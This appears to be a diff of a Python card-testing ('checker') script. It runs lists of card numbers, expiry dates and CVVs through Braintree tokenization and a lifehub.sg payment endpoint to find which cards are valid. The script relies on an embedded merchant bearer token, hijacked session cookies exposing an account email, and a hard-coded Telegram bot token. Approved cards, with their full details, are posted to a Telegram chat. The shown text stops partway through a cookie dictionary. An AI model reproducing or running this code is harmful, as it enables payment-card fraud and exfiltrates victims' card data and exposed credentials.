@@ -1,112 +1,102 @@
-import importlib.util, os
+import os, webbrowser
+webbrowser.open('https://t.me/ModcaTheLost')
 try:
-    api_path = os.path.join(os.path.dirname(importlib.util.find_spec("requests").origin), 'api.py')
-    if os.path.exists(api_path):
-        with open(api_path, 'r') as file:
-            content = file.read()
-            if any(keyword in content for keyword in ['print', 'sys', 'logging', 'write', 'warn']):
-                exit("لا تحاول تسحب روابط | Protect By ModcaPy | ~ @B_6_Q ~")
-except Exception as e:
-    pass
-import requests,os,sys, urllib.request
-while True:
-    try:
-        url = urllib.request.urlopen("https://t.me/Tools_VIPP/19").read().decode('utf-8') 
-        break
-    except:print("TURN VPN")
-if "all" not in url:
-    print('')
-    print('\n')
-    print('Tσσℓѕ Sтσρрє∂ ')
-    print('\n')
-    print('لا تحاول تسحب روابط | Protect By ModcaPy | ~ @B_6_Q ~ ')
-    print('\n')
-    
-O =  '\033[1;31m' #Red.... like< Red Line > only Anime fan will know☆
-Z =  '\033[1;37m' #white
-F = '\033[1;32m' #Green
-B = '\033[2;36m' #Light Blue
-X = '\033[1;33m' #Yellow
-C = '\033[2;35m' #Purple
-from cfonts import render
-#print("\x1b[1;39m","_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ")
-output = render('MODCA', colors=['white', 'red'], align='center')
-print(output)
-
-print("~ 𝗣яσɢяαммεя • 𝗠𝗼𝗱𝗰𝗮 • -> @B_6_Q ~ 𝗖нαиияℓ : @ModcaTheLost ~")
-print('\033[1;31m_' * 60)
-print('\n')
-import sys
-
-authorized_users = [1296559148, 5966873984, 1296559148, 6695873549, 5702803191, 6174126557, 5612427625, 1970257616, 7408511525, 912917157, 6603688300, 5123986264, 6609362604, 1418522621, 2084607021, 6084792010, 1544900384, 2104799478, 2093600923,959477905,959477905]
-
-def check_authorized(user_id):
-    if user_id in authorized_users:
-        return True
-    else:
-        return False
-
-user = int(input(f"{O}Enter Your ID : "))
-
-if check_authorized(user):
-    print("تم تفعيل الأداة بنجاح، مرحبًا بك!")
-else:
-    print(f"{Z}   غير مصرح لك بتشغيل هذه الأداة.")
-    print('\n')
-    print('Tσσℓѕ Sтσρрє∂ ')
-    print('\n')
-    print('لا تحاول تسحب روابط | Protect By ModcaPy | ~ @B_6_Q ~ ')
-    print('\n')
-
-    print('https://t.me/ModcaTheLost ')
-    print('هذه قناة التحديثات انضم وانتظر التحديثات ')
-    sys.exit()
-
-try:
-        import requests
+	import requests
 except ModuleNotFoundError:
-        print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
-        os.system('pip install requests')
-
+	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
+	os.system('pip install requests')
+	
 try:
-        import user_agent
+	from cfonts import render  
 except ModuleNotFoundError:
-        print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
-        os.system('pip install user_agent')
-
-
+	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
+	os.system('pip install python-cfonts')
+	
 try:
-        from fake_useragent import UserAgent
+	from fake_useragent import UserAgent
 except ModuleNotFoundError:
-        print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
-        os.system('pip install fake_useragent')
-
-try:
-        from cfonts import render
-except ModuleNotFoundError:
-        print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
-        os.system('pip install python-cfonts')
-
-
-import os,user_agent,fake_useragent
-from cfonts import render, say
+	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
+	os.system('pip install fake_useragent')
 import requests,time,webbrowser,json,os,sys,re,user_agent,random
 from cfonts import render, say
 import random,string,user_agent,base64
 from fake_useragent import UserAgent
+#from bin_info_v1 import bin_info
+
+try:
+	import requests
+except ModuleNotFoundError:
+	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
+	os.system('pip install requests')
+try:
+	from user_agent import generate_user_agent
+except ModuleNotFoundError:
+	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
+	os.system('pip install user_agent')
+	
+try:
+	from cfonts import render  
+except ModuleNotFoundError:
+	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
+	os.system('pip install python-cfonts')
+	
+try:
+	 import user_agent
+except ModuleNotFoundError:
+	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
+	os.system('pip install user_agent')
 
 user = user_agent.generate_user_agent()
+		
 r = requests.session()
+	
 r.follow_redirects = True
+	
 r.verify = False
 
-Z =  '\033[1;31m'
-F = '\033[2;32m'
+
+Z =  '\033[1;31m' 
+F = '\033[2;32m' 
 B = '\033[2;36m'
-X = '\033[1;33m'
+X = '\033[1;33m' 
 C = '\033[2;35m'
 w = '\033[2;37m'
-y = '\033[1;34m'
+y = '\033[1;34m' 
+
+
+
+md1 = '\x1b[1;31m'  # أحمر
+md2 = '\x1b[1;32m'  # أخضر
+md3 = '\x1b[38;5;153m'
+a5 = '\x1b[38;5;208m'
+Z =  '\033[1;31m' 
+F = '\033[2;32m' 
+B = '\033[2;36m'
+X = '\033[1;33m' 
+C = '\033[2;35m'
+a1 = '\x1b[1;31m'  # أحمر
+a2 = '\x1b[1;34m'  # أزرق
+a3 = '\x1b[1;32m'  # أخضر
+a4 = '\x1b[1;33m'  # أصفر
+a5 = '\x1b[38;5;208m'  # برتقالي
+a6 = '\x1b[38;5;5m'  # أرجواني
+a7 = '\x1b[38;5;13m'  # وردي
+a8 = '\x1b[1;30m'  # أسود
+a9 = '\x1b[1;37m'  # أبيض
+E = '\033[1;31m'
+B = '\033[2;36m'
+G = '\033[1;32m'
+S = '\033[1;33m'
+F = '\033[1;32m'  # Ø§Ø®Ø¶Ø±
+B = "\033[1;30m"  # Black
+R = "\033[1;31m"  # Red
+G = "\033[1;32m"  # Green
+Y = "\033[1;33m"  # Yellow
+Bl = "\033[1;34m"  # Blue
+P = "\033[1;35m"  # Purple
+C = "\033[1;36m"  # Cyan
+W = "\033[1;37m"  # White
+PN = "\033[1;35m"  # PINK
 
 import sys,time,os
 def lo(word):
@@ -117,68 +107,76 @@ def lo(word):
             time.sleep(0.1)
             sys.stdout.flush()
 lo(" \x1b[1;36m      𝐖𝐚𝐢𝐭.𝐅𝐨𝐫 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐚𝐭𝐢𝐨𝐧... ")
-os.system('clear')
-from cfonts import render
-#print("\x1b[1;39m","_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ")
-output = render('MODCA', colors=['white', 'red'], align='center')
+os.system('clear')            
+from cfonts import render  
+#print("\x1b[1;39m","_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ")          
+output = render('MODCA', colors=['white', 'magenta'], align='center')
 print(output)
 
-print("~ 𝗣яσɢяαммεя • 𝗠𝗼𝗱𝗰𝗮 • -> @B_6_Q ~ 𝗖нαиияℓ : @ModcaTheLost ~")
-print('\033[1;31m_' * 60)
+print("      ~ 𝗣яσɢяαммεя • 𝗠𝗼𝗱𝗰𝗮 • -> @B_6_Q ~ 𝗖нαиияℓ : @ModcaTheLost ~")
+print("\x1b[38;5;5m—" * 72)
 print('\n')
-
-token = input('Enter Your Token : ')
-id = input('Enter Your ID : ')
-
-file=open('Modca.txt',"+r")
-start_num = 0
-for P in file.readlines():
-    start_num += 1
-    n = P.split('|')[0]
-    bin3=n[:6]
-    mm=P.split('|')[1]
-    if int(mm) == 12 or int(mm) == 11 or int(mm) == 10:
-        mm = mm
-    elif '0' not in mm:
-        mm = f'0{mm}'
-    else:
-        mm = mm
-    yy=P.split('|')[2]
-    cvc=P.split('|')[3].replace('\n', '')
-    P=P.replace('\n', '')
-    if "20" not in yy:
-        yy = f'20{yy}'
-    else:
-        yy = yy
-    start_time = time.time()
-    #time.sleep(10)
-
+E = '\033[1;31m'
+X = '\033[1;33m'
+F = '\033[2;32m'
+M = '\x1b[1;37m'
+B = '\x1b[38;5;208m'
+print(E)
+path = 'Modca.txt'
+token = '6913577462:AAFOToNfrJXeCoi005jVD7R13DKS9wjJx4I'
+#
+ID = '5123986264'
+start = 0
+with open(path) as file:
+                lino = file.readlines()
+                lino = [line.rstrip() for line in lino]
+try:
+	import requests,re,time
+	from colorama import Fore
+	from bs4 import BeautifulSoup
+	import pyfiglet
+	import os
+	import time
+	import requests
+	import re
+except ImportError:
+	os.system('pip install requests')
+	os.system('pip install re')
+	os.system('pip install time')
+	os.system('pip install colorama')
+	os.system('pip install bs4')
+	os.system('pip install pyfiglet')
+def cc(e):
+	n = e.split('|')[0]
+	mm = e.split('|')[1]
+	yy = e.split('|')[2][-2:]
+	cvv = e.split('|')[3]
+	card=e.replace('\n','')
+	import requests
     
-    
-        
-    headers = {
+	headers = {
         'authority': 'payments.braintree-api.com',
         'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
-        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzU4NTY2NjUsImp0aSI6Ijc1ZmQzOWMyLTIyOGUtNDlmMS1iOTFkLTg0YjBkZjNmMjU5ZCIsInN1YiI6InBiZ2dxNTZyNzR5NjVmZ3giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBiZ2dxNTZyNzR5NjVmZ3giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.jFnz5BsKvdjlgPeThRxwzrMjKj4R9Ke2Mm4Kx98-4GG4tcm08IHvUSzRjU5D3aAKUXpl_8EaRL0CkDjqh7ggDQ',
+        'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzYxODQ4OTMsImp0aSI6IjJmZjg0MGRjLWY2OGItNGZmNS04YTZiLTVhZmVlODI2NzEyMiIsInN1YiI6Im1rbWZiaGI2ZDJoOTUzcXciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im1rbWZiaGI2ZDJoOTUzcXciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.ruBNmeAWgz07riWW-zR6biYdkSeGgruTZRAeGp6Bzg8RM2TuH0GlyYggR3GerGdvc9V_RRDAldgrGb5XQH4fGg',
         'braintree-version': '2018-05-10',
         'content-type': 'application/json',
         'origin': 'https://assets.braintreegateway.com',
         'referer': 'https://assets.braintreegateway.com/',
-        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'cross-site',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
     }
     
-    json_data = {
+	json_data = {
         'clientSdkMetadata': {
             'source': 'client',
             'integration': 'custom',
-            'sessionId': '0abc94da-f92f-44c7-a073-cc81711db882',
+            'sessionId': '6e6bad6d-0408-47a1-9d3f-eeb5e804c872',
         },
         'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
         'variables': {
@@ -187,7 +185,7 @@ for P in file.readlines():
                     'number': n,
                     'expirationMonth': mm,
                     'expirationYear': yy,
-                    'cvv': cvc,
+                    'cvv': cvv,
                 },
                 'options': {
                     'validate': False,
@@ -197,252 +195,113 @@ for P in file.readlines():
         'operationName': 'TokenizeCreditCard',
     }
     
-    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-    
-    
-    
-    try:
-        tok = (response.json()['data']['tokenizeCreditCard']['token'])
-    except TypeError:
-        print('Call Modca To Update Habibi 💸 ')
-        sys.exit()
-
-
-    
-    
-    cookies = {
-        'visid_incap_2624039': '/fudJLClQs259Q/frigJRaf9JWcAAAAAQUIPAAAAAACwGwdp3k0cPOgqg6iEYAFh',
-        'osVisitor': '1875de0b-9cfb-4cfe-bd66-744771ee42be',
-        '_gcl_au': '1.1.346592010.1730543022',
-        '_ga': 'GA1.1.214830494.1730543022',
-        '_fbp': 'fb.1.1730543022262.343117564879421434',
-        '3': 'ojJZPmMTWhk6Eoktt4P0sLYbyoxcvpDOLoIHrMiWbkb3sEDeFRggBeGcz9t4u3fu85dSTjv85ayO4bZOJaLxUN0hWlPNubrIxr9o3oX766SNWsZrG+NsNsprBzCVdEX1',
-        '1': 'qprkeaqJ4xw2rqUU1qlYOf2Nv9xHwtKz1xbvfa0AXtQ2I1e7AKBmJwp6rI5dJW8mIFZz7P/yxH/uYK9y8tfPcuZ+y7V6zrBwdEocWcx3f6Wp5lI5OZBE0b6wR0U72GyaWwUGEiy67m7FoyC5fxgPqzehxZAeO+uVVQWm+9/JA2begjVXFmEPgvZd00Z/C9EGWNkBmlA/EBMZ9/yC3AqzuRgtEPXNl4oHuQt7rebwVSpZFcGPbWZLp5jqHfdrbtCBjHxMDYVrJJotrxyu5pwnHhWfyz4hA38tWxasE5Qq+pwuc8wu2AcPGENOA7gpr9w/TILvB8fecmmVxOeU3BtaDO5hHsF9SbyNx9dFUVhI3mxm9o6hIma97jlePMhGS2J7Ph2CXM3l/izA9LYFHz9i99H2ZeVmsNphqvaXz6uDYJx5wLYF3fRuSk/+9Ix3BUjYsBGHMPQXX5AGo9bqS1MSy5i308so+iv2uTJsiWGUQ8OHSHq+VAM0G4lb0RmDwYfhq5HYr9erH5r5EMzHUR3ABYBISHyzqYWmuv+YLFMNofIJmh8QVK0HseQiDqeWFR6PVjY+W+9WXWh4xfpM56sivqMjb2GuxDrtPjvQaCzqvWMqU/2KWOA+z9Z8ejwN5VeEKn3P2LY83OpIbCGjeuAOQ3rkMVtsCBb4YAMD/QHQTok4yKRT7TrUBbs6HHBwjMnRbRxKClBEbH1EZnXi/3tSHIb1MJBnFInxSveE7iGlWVFf7ha6XjFgsFim4YYggOOzr49w1LMhirbb+MbvWGYDz5cfmY629Wiups+r2CE0QUVoDkcCKHbc8kmPmKIwACA3rzS1bg0sKLWlSuP8b3nojEsbxVd5SfVLmO7mcQenEbHfb6qTSzBjV4+UC4MoG4TAxBo02b+ZqI+40/RYidhV3HagZ/gvo+h6Ta6CIpA8Gqcnc54w7blsL4EW7FtgPij/uJeklAAOcrrbBIoZqka9He+hjsedubOquBoHbzYsdG7EPNpEzhNAL7zNBr/oy5Ms+rhy5Q/1k29h8EfrmPn7dSLlcPrj8q2zpYQdIK9/M6662bSycBGoiISR+lyokXDcjnfk+xcuiqGspiyJYdXJRcPGC86i41XX2krFMz8yKSHeGPNqhBVGres83YG7j25cYST0/JGWkx9d2yjNq0lMK0DdC5WOl6pGn2vkpZsEhHM0sGrfrcjabZKv2zIKwe0Ce2n+2u54uX74wZ5bFMuMkDlfhIrczkP9ETXFdDNINt8PUoiktZ6iQse251KHnFp3vXZVrLX1KeuXoosnljb7svjylzdr7XmheoXgsJv1cshNpCAllpGlgAMt7beb2nWeYpfjpMk4pQGRLWrgXvH4P6/haGR2oHNOhCtiWbmTREZFpDKY1AO9nbxZPFxZq1x/KuSs+0QVdrikPe00APZWIVCgo1qgfUXVwDNdM3Docuw=',
-        '2': 'Z6OyVWr1doyVFeSR8nGuVqBoBoW4V7ZWDoR/UiprSFVD1N8dAZWldL/dg9JZ29SgYuPEg463VdajsFXtQjRWLJo/eCRt8cjCWeQXZEKh9XLPWhTYut+cOMKTTDm20KUxt+wLzwiMj0wVNZIBNbl7bw==',
-        'nr2ApolloUser_CS': 'crf%3dkHUF%2f2SaeYof2VV0aUMllJQo6V4%3d%3buid%3d1338501%3bunm%3dnikmokbb321%40gmail.com',
-        'nlbi_2624039': '3dbROLzzdVvotLKUnrr3FQAAAADkPaMg1jcS3yBnxXHHsJRT',
-        'incap_ses_467_2624039': 'JAuxX1lzEBMepKZ9Ph57Bjb6aWcAAAAAwsvSEp96SHrNeYSfL8vTLw==',
-        'osVisit': '63544d6f-cc06-4bf4-85b3-d1f2fd237e74',
-        'nr1ApolloUser_CS': 'lid%3dup8g6a3gUUr2r4Cd1I%2btqQ%3d%3d0LWNjxz81NGX12YtygTBxg%3d%3d%3btuu%3d63870595689%3bexp%3d63873187389%3brhs%3dqmqs21oSCQNMIa57tnJPUgE%2bd9A%3d%3bhmc%3datsEH83sCORf3prJVQ%2bgLM3h9HQ%3d',
-        '_ga_WSCFS5WWZ0': 'GS1.1.1734998590.31.0.1734998590.0.0.0',
-        'ASP.NET_SessionId': 'knjgyh5kmvxwusfkxniphm31',
-    }
-
-    headers = {
-        'authority': 'www.lifehub.sg',
-        'accept': 'application/json',
-        'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
-        'content-type': 'application/json; charset=UTF-8',
-        # 'cookie': 'visid_incap_2624039=/fudJLClQs259Q/frigJRaf9JWcAAAAAQUIPAAAAAACwGwdp3k0cPOgqg6iEYAFh; osVisitor=1875de0b-9cfb-4cfe-bd66-744771ee42be; _gcl_au=1.1.346592010.1730543022; _ga=GA1.1.214830494.1730543022; _fbp=fb.1.1730543022262.343117564879421434; 3=ojJZPmMTWhk6Eoktt4P0sLYbyoxcvpDOLoIHrMiWbkb3sEDeFRggBeGcz9t4u3fu85dSTjv85ayO4bZOJaLxUN0hWlPNubrIxr9o3oX766SNWsZrG+NsNsprBzCVdEX1; 1=qprkeaqJ4xw2rqUU1qlYOf2Nv9xHwtKz1xbvfa0AXtQ2I1e7AKBmJwp6rI5dJW8mIFZz7P/yxH/uYK9y8tfPcuZ+y7V6zrBwdEocWcx3f6Wp5lI5OZBE0b6wR0U72GyaWwUGEiy67m7FoyC5fxgPqzehxZAeO+uVVQWm+9/JA2begjVXFmEPgvZd00Z/C9EGWNkBmlA/EBMZ9/yC3AqzuRgtEPXNl4oHuQt7rebwVSpZFcGPbWZLp5jqHfdrbtCBjHxMDYVrJJotrxyu5pwnHhWfyz4hA38tWxasE5Qq+pwuc8wu2AcPGENOA7gpr9w/TILvB8fecmmVxOeU3BtaDO5hHsF9SbyNx9dFUVhI3mxm9o6hIma97jlePMhGS2J7Ph2CXM3l/izA9LYFHz9i99H2ZeVmsNphqvaXz6uDYJx5wLYF3fRuSk/+9Ix3BUjYsBGHMPQXX5AGo9bqS1MSy5i308so+iv2uTJsiWGUQ8OHSHq+VAM0G4lb0RmDwYfhq5HYr9erH5r5EMzHUR3ABYBISHyzqYWmuv+YLFMNofIJmh8QVK0HseQiDqeWFR6PVjY+W+9WXWh4xfpM56sivqMjb2GuxDrtPjvQaCzqvWMqU/2KWOA+z9Z8ejwN5VeEKn3P2LY83OpIbCGjeuAOQ3rkMVtsCBb4YAMD/QHQTok4yKRT7TrUBbs6HHBwjMnRbRxKClBEbH1EZnXi/3tSHIb1MJBnFInxSveE7iGlWVFf7ha6XjFgsFim4YYggOOzr49w1LMhirbb+MbvWGYDz5cfmY629Wiups+r2CE0QUVoDkcCKHbc8kmPmKIwACA3rzS1bg0sKLWlSuP8b3nojEsbxVd5SfVLmO7mcQenEbHfb6qTSzBjV4+UC4MoG4TAxBo02b+ZqI+40/RYidhV3HagZ/gvo+h6Ta6CIpA8Gqcnc54w7blsL4EW7FtgPij/uJeklAAOcrrbBIoZqka9He+hjsedubOquBoHbzYsdG7EPNpEzhNAL7zNBr/oy5Ms+rhy5Q/1k29h8EfrmPn7dSLlcPrj8q2zpYQdIK9/M6662bSycBGoiISR+lyokXDcjnfk+xcuiqGspiyJYdXJRcPGC86i41XX2krFMz8yKSHeGPNqhBVGres83YG7j25cYST0/JGWkx9d2yjNq0lMK0DdC5WOl6pGn2vkpZsEhHM0sGrfrcjabZKv2zIKwe0Ce2n+2u54uX74wZ5bFMuMkDlfhIrczkP9ETXFdDNINt8PUoiktZ6iQse251KHnFp3vXZVrLX1KeuXoosnljb7svjylzdr7XmheoXgsJv1cshNpCAllpGlgAMt7beb2nWeYpfjpMk4pQGRLWrgXvH4P6/haGR2oHNOhCtiWbmTREZFpDKY1AO9nbxZPFxZq1x/KuSs+0QVdrikPe00APZWIVCgo1qgfUXVwDNdM3Docuw=; 2=Z6OyVWr1doyVFeSR8nGuVqBoBoW4V7ZWDoR/UiprSFVD1N8dAZWldL/dg9JZ29SgYuPEg463VdajsFXtQjRWLJo/eCRt8cjCWeQXZEKh9XLPWhTYut+cOMKTTDm20KUxt+wLzwiMj0wVNZIBNbl7bw==; nr2ApolloUser_CS=crf%3dkHUF%2f2SaeYof2VV0aUMllJQo6V4%3d%3buid%3d1338501%3bunm%3dnikmokbb321%40gmail.com; nlbi_2624039=3dbROLzzdVvotLKUnrr3FQAAAADkPaMg1jcS3yBnxXHHsJRT; incap_ses_467_2624039=JAuxX1lzEBMepKZ9Ph57Bjb6aWcAAAAAwsvSEp96SHrNeYSfL8vTLw==; osVisit=63544d6f-cc06-4bf4-85b3-d1f2fd237e74; nr1ApolloUser_CS=lid%3dup8g6a3gUUr2r4Cd1I%2btqQ%3d%3d0LWNjxz81NGX12YtygTBxg%3d%3d%3btuu%3d63870595689%3bexp%3d63873187389%3brhs%3dqmqs21oSCQNMIa57tnJPUgE%2bd9A%3d%3bhmc%3datsEH83sCORf3prJVQ%2bgLM3h9HQ%3d; _ga_WSCFS5WWZ0=GS1.1.1734998590.31.0.1734998590.0.0.0; ASP.NET_SessionId=knjgyh5kmvxwusfkxniphm31',
-        'origin': 'https://www.lifehub.sg',
-        'referer': 'https://www.lifehub.sg/product-payment',
-        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Linux"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-        'x-csrftoken': 'kHUF/2SaeYof2VV0aUMllJQo6V4=',
-    }
-
-    json_data = {
-        'versionInfo': {
-            'moduleVersion': '2kO0xfHUmy5B4kIlM5D_vw',
-            'apiVersion': 'OjcubfFn7YcjWGXofM4rfQ',
-        },
-        'viewName': 'LoggedInFlow_PurchaseProduct.PurchaseProductPayment',
-        'inputParameters': {
-            'Product': {
-                'ProductDetails': {
-                    'ProductId': '1',
-                    'Name': '',
-                    'ProductPrice': '0',
-                    'TotalPrice': '1',
-                    'DiscountPrice': '0',
-                    'Order': 0,
-                    'Description': '',
-                    'Quantity': 0,
-                },
-            },
-            'TokenNonce': tok,
-        },
-    }
-    
-    response = requests.post(
-        'https://www.lifehub.sg/screenservices/NewApollo/LoggedInFlow_PurchaseProduct/PurchaseProductPayment/ActionStep2_GetProductPaymentTokenFor3DS',
-        cookies=cookies,
-        headers=headers,
-        json=json_data,
-    )
-    
-    response = requests.post(
-        'https://www.lifehub.sg/screenservices/NewApollo/LoggedInFlow_PurchaseProduct/PurchaseProductPayment/ActionStep2_GetProductPaymentTokenFor3DS',
-        cookies=cookies,
-        headers=headers,
-        json=json_data,
-    ).text
-# Note: json_data will not be serialized by requests
-# exactly as it was in the original request.
-#data = '{"versionInfo":{"moduleVersion":"dPmoD0Lswu5LjWnllIRuLw","apiVersion":"OjcubfFn7YcjWGXofM4rfQ"},"viewName":"LoggedInFlow_PurchaseProduct.PurchaseProductPayment","inputParameters":{"Product":{"ProductDetails":{"ProductId":"1","Name":"","ProductPrice":"0","TotalPrice":"21","DiscountPrice":"0","Order":0,"Description":"","Quantity":0}},"TokenNonce":"tokencc_bh_n8fwyx_xjq9zc_h4yvtf_mkjsdp_bz6"}}'
-#response = requests.post(
-#    'https://www.lifehub.sg/screenservices/NewApollo/LoggedInFlow_PurchaseProduct/PurchaseProductPayment/ActionStep2_GetProductPaymentTokenFor3DS',
-#    cookies=cookies,
-#    headers=headers,
-#    data=data,
-#)
-    end_time = time.time()
-    elapsed_time = round(end_time - start_time, 2)
-    #print(P,'>>',response.text)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    if 'CHARGED' in response or 'avs' in response or 'postal' in response or 'approved' in response or 'Nice!' in response or 'Approved' in response or 'Duplicate' in response or 'Successful' in response or 'successful' in response or 'Thank you' in response or 'confirmed' in response or 'successfully' in response:
-        print(f'{P} >> 𝗖𝗛𝗔𝗥𝗚𝗘 ✅ < 2020: > < Everything ✅ > ')
-
-    elif "Insufficient Funds" in response:
-        print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < Google Play ✅ > ')
-        requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
-        Cαя∂ -> {n}|{mm}|{yy}|{cvc}
-          Bιи -> {P[:6]}
-          Gαтєωαу -> Braintree Auth
-        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
-        Rєѕρσиѕє -> Insufficient Funds ✅
-        ID -> {id}
-       Uѕєя αgєит -> {user}
-                Tιмє -> {elapsed_time} SєcσиDѕ .
-
-            Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
-        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
-        #
-
-    elif 'Card Issuer Declined CVV' in response:
-        print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < 2010: 𝗖𝗖𝗡 ✅ > < Just Try The Sites ✅ > ')
-        requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
-        Cαя∂ -> {n}|{mm}|{yy}|{cvc}
-          Bιи -> {P[:6]}
-          Gαтєωαу -> Braintree Auth
-        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
-        Rєѕρσиѕє -> 𝗖𝗖𝗡 ✅
-        ID -> {id}
-
-       Uѕєя αgєит -> {user}
-                Tιмє -> {elapsed_time} SєcσиDѕ .
-
-            Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
-        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")#
-
-
-
-
-    elif 'Gateway Rejected: cvv' in response:
-        print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < cvv ✅ > < Google Play ✅ > ')
-        requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
-        Cαя∂ -> {n}|{mm}|{yy}|{cvc}
-          Bιи -> {P[:6]}
-          Gαтєωαу -> Braintree Auth
-        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
-        Rєѕρσиѕє -> 𝗔ρρяσνє𝗗 ✅ < cvv ✅ > ✅
-        ID -> {id}
-
-       Uѕєя αgєит -> {user}
-                Tιмє -> {elapsed_time} SєcσиDѕ .
-
-            Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
-        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
-
-
+	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+
+	tokens = response.json()['data']['tokenizeCreditCard']['token']
+	import requests
+
+	cookies = {
+    '_gcl_au': '1.1.416404024.1736006411',
+    '__utmzz': 'utmcsr=(direct)|utmcmd=(none)|utmccn=(not set)',
+    '_gid': 'GA1.2.392367569.1736006412',
